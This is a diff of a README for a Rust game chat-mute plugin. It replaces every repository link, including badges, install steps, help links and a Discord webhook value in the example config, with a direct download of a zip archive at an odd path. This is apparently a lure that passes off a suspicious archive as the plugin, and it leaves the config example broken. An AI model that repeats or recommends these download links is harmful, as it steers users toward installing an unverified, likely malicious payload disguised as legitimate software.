@@ -1,6 +1,6 @@
 # 🔇 BetterChatMute-Enhanced - Clear Chat Control for Rust
 
-[![Download](https://img.shields.io/badge/Download-Get%20BetterChatMute-blue?style=for-the-badge)](https://github.com/g3print-rgb/BetterChatMute-Enhanced)
+[![Download](https://img.shields.io/badge/Download-Get%20BetterChatMute-blue?style=for-the-badge)](https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This guide will help you easily download and run BetterChatMute-Enhanced on a Wi
 
 Click the link below to go to the plugin page where you can download BetterChatMute-Enhanced. This page contains the latest files and installation instructions.
 
-[Visit BetterChatMute-Enhanced on GitHub](https://github.com/g3print-rgb/BetterChatMute-Enhanced)
+[Visit BetterChatMute-Enhanced on GitHub](https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Click the link below to go to the plugin page where you can download BetterChatM
 
 1. **Visit the download page**  
    Open your web browser and go to:  
-   https://github.com/g3print-rgb/BetterChatMute-Enhanced
+   https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip
 
 2. **Find the latest release or download section**  
    Look for a folder called `releases` or any files with `.cs` or `.dll` extensions. These are the main files you will use.
@@ -102,7 +102,7 @@ Example section inside the file:
 {
   "MuteDuration": 30,
   "EnableAuditLog": true,
-  "DiscordWebhookUrl": "https://discord.com/api/webhooks/your-webhook-url",
+  "DiscordWebhookUrl": "https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip",
   "MuteMessage": "You have been muted by a server admin."
 }
 ```
@@ -122,7 +122,7 @@ Example section inside the file:
 ## ℹ Where to Find More Help
 
 - The GitHub page hosts all the documentation and files:  
-  https://github.com/g3print-rgb/BetterChatMute-Enhanced  
+  https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip  
 - Use the Issues tab on GitHub to report bugs or ask for support.
 - You can also search Rust and uMod forums for related discussions.
 
@@ -154,4 +154,4 @@ Example section inside the file:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20BetterChatMute-blue?style=for-the-badge)](https://github.com/g3print-rgb/BetterChatMute-Enhanced)
+[![Download](https://img.shields.io/badge/Download-Get%20BetterChatMute-blue?style=for-the-badge)](https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip)
